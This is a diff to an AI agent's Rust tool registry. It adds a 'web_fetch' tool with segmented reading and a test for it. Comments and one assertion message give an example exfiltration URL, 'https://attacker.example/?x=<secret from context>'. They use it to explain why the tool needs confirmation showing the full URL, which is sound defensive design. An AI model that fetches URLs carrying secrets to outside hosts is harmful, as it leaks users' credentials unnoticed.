@@ -746,6 +746,37 @@ pub fn web_search_spec() -> ToolSpec {
     }
 }
 
+pub fn web_fetch_spec() -> ToolSpec {
+    ToolSpec {
+        name: "web_fetch".into(),
+        description: "把一个网页读回来（正文，markdown）。搜索只给标题和摘要 ——                       要看细节（API 参数、完整步骤、代码示例）就用这个。                      长页面会分段：结果里带着整页多长、下一段从哪开始"
+            .into(),
+        parameters: serde_json::json!({
+            "type": "object",
+            "properties": {
+                "url": { "type": "string", "description": "要读的网页地址（http/https）" },
+                // ⚠️ 这一位的说明要讲清「什么时候用」。只说「起始位置」的话，
+                // 模型看到 `next_offset` 也不知道该拿它干什么，于是永远只读
+                // 第一段，然后拿着半篇文档回答
+                "offset": {
+                    "type": "integer",
+                    "description": "从整页的第几个字符接着读。上一次结果里的 next_offset 原样填进来，                                    就能读下一段；第一次不用传"
+                }
+            },
+            "required": ["url"]
+        }),
+        // 与 `web_search` 同级，理由也同一条：它**把 URL 发到第三方服务上**。
+        //
+        // ⚠️ 而且它比搜索更宽 —— 搜索发的是一句搜索词，抓取发的是一个
+        // 完整 URL，而 `https://attacker.example/?x=<上下文里的密钥>` 就是
+        // 一次外泄，长得却和一次正常抓取一模一样。确认面板上要摆完整 URL，
+        // 不能只显示域名
+        risk: Risk::Write,
+        path_arg: None,
+        source: ToolSource::Builtin,
+    }
+}
+
 /// 资料库的两个工具 —— **检索 + 按段读**。
 ///
 /// # 为什么是两个而不是一个「读整份」
@@ -2248,6 +2279,37 @@ mod tests {
         assert!(
             desc.contains("日期"),
             "topic 的说明要讲清「只有这一档带日期」，否则模型没有理由选它。实际：{desc}"
+        );
+    }
+
+    /// ⚠️ **`offset` 必须摆进工具目录，而且说明要讲清怎么用。**
+    ///
+    /// 长页面分段读全靠它。目录里没有的话模型永远只读第一段，然后拿着
+    /// 半篇文档回答 —— 而没有任何一处会报错。就算摆了，说明里只写
+    /// 「起始位置」也不够：模型看到结果里的 `next_offset` 未必知道
+    /// 该拿它干什么。
+    #[test]
+    fn 抓网页那个工具把分段读的钩子摆了出来() {
+        let spec = web_fetch_spec();
+        let props = spec.parameters["properties"]
+            .as_object()
+            .expect("参数表该是个对象");
+
+        assert!(props.contains_key("url"));
+        assert!(
+            props.contains_key("offset"),
+            "没有 offset，长页面就只能读第一段 —— 而实测七个页面里三个超一次的预算"
+        );
+        let desc = props["offset"]["description"].as_str().unwrap_or_default();
+        assert!(
+            desc.contains("next_offset"),
+            "说明里要点名 next_offset，模型才知道这两者是一对。实际：{desc}"
+        );
+
+        assert_eq!(
+            spec.risk,
+            Risk::Write,
+            "它把完整 URL 发到第三方 —— `?x=<上下文里的密钥>` 就是一次外泄，             而它长得和一次正常抓取一模一样"
         );
     }
 
